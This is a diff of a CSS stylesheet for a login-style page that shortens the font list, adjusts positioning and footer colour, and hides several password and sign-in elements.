@@ -4,10 +4,10 @@ body {
     background-size: cover;
     background-position: center center;
     background-attachment: fixed;
-
-    font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math", serif;
+    font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", sans-serif;
     margin: 0;
     height: 100vh;
+    position: relative;
 }
 
 main#main {
@@ -16,6 +16,8 @@ main#main {
     align-items: center;
     min-height: 100vh;
     justify-content: center;
+    position: relative;
+    z-index: 1;
 }
 
 .main-box {
@@ -32,6 +34,18 @@ main#main {
     min-height: 338px;
     overflow: hidden;
     margin: 0;
+}
+.logotype{
+    max-height: 36px;
+}
+#input-pass{
+    display: none;
+}
+.password{
+    display: none;
+}
+.sing-in{
+    display: none;
 }
 
 .sing-in-title {
@@ -136,7 +150,9 @@ main#main {
     font-weight: 400;
     font-style: normal;
 }
-
+#input-password{
+    display: none;
+}
 .btn, button, input[type='button'], input[type='submit'], input[type='reset'] {
     margin-top: 0;
     margin-bottom: 0;
@@ -198,10 +214,10 @@ footer {
     min-height: 28px;
     display: flex;
     justify-content: flex-end;
+    color: #000;
 
     .more, .privacy-cookies, .terms {
         margin: 0 8px;
-        color: #000;
         font-size: 12px;
         line-height: 28px;
         white-space: nowrap;
